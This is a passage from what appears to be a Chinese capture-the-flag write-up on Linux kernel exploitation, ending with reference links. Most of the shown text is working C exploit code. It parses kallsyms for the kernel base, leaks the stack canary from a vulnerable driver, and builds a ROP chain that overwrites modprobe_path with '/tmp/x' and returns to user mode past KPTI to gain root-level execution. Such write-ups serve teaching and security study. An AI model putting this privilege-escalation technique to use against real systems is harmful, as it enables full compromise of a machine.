    syms = fopen("/tmp/kallsyms", "r");
    if (syms == NULL) {
        puts("\033[31m\033[1m[-] Open /tmp/kallsyms failed.\033[0m");
        exit(0);
    }

    while (fscanf(syms, "%lx %s %s", &addr, type, name)) {

        if (!swapgs_restore_regs_and_return_to_usermode && strcmp(name, "swapgs_restore_regs_and_return_to_usermode") == 0) {
            swapgs_restore_regs_and_return_to_usermode = addr;
            printf("\033[33m\033[1m[√] Found swapgs_restore_regs_and_return_to_usermode: %lx\033[0m\n", swapgs_restore_regs_and_return_to_usermode);
            break;
        }

    }

    offset = swapgs_restore_regs_and_return_to_usermode - 0xa008da - 0xffffffff81000000;
    core_set_offset(fd, 64);
    core_read(fd, name);
    canary = ((size_t *)name)[0];
    printf("\033[34m\033[1m[*] base: 0x%lx\033[0m\n", swapgs_restore_regs_and_return_to_usermode-0xa008da);
    printf("\033[34m\033[1m[*] offset: 0x%lx\033[0m\n", offset);
    printf("\033[33m\033[1m[√] Canary: %lx\033[0m\n", canary);

    for (i = 0; i < 10; i++) rop[i] = canary;
    rop[i++] = POP_RBX_RET + offset;
    rop[i++] = MODPROBE_PATH + offset;
    rop[i++] = POP_RAX_RET + offset;
    rop[i++] = *(size_t *) "/tmp/x";
    rop[i++] = MOV_PTR_RBX_RAX_POP_RBX_RET + offset;
    rop[i++] = *(size_t *) "muElnova";
    rop[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + offset;
    rop[i++] = *(size_t *) "muElnova";
    rop[i++] = *(size_t *) "muElnova";
    rop[i++] = (size_t) getFlag;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;


    write(fd, rop, 0x100);
    core_copy(fd, 0xffffffffffff0000 | (0x100));
}
```



## 参考资料

https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/

[Kernel Pwn ROP bypass KPTI - Wings 的博客 (wingszeng.top)](https://blog.wingszeng.top/kernel-pwn-rop-bypass-kpti/)
